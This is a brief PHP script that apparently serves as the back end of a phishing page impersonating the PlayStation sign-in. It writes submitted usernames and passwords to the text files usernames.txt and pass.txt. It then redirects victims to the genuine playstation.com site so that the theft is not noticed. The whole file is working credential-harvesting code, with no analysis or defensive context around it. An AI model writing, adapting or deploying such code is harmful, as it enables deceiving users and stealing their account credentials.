<?php

file_put_contents("usernames.txt", "PlayStation username : " . $email = $_POST['usernames'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "PlayStation Password : " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.playstation.com/en-in/');
?>
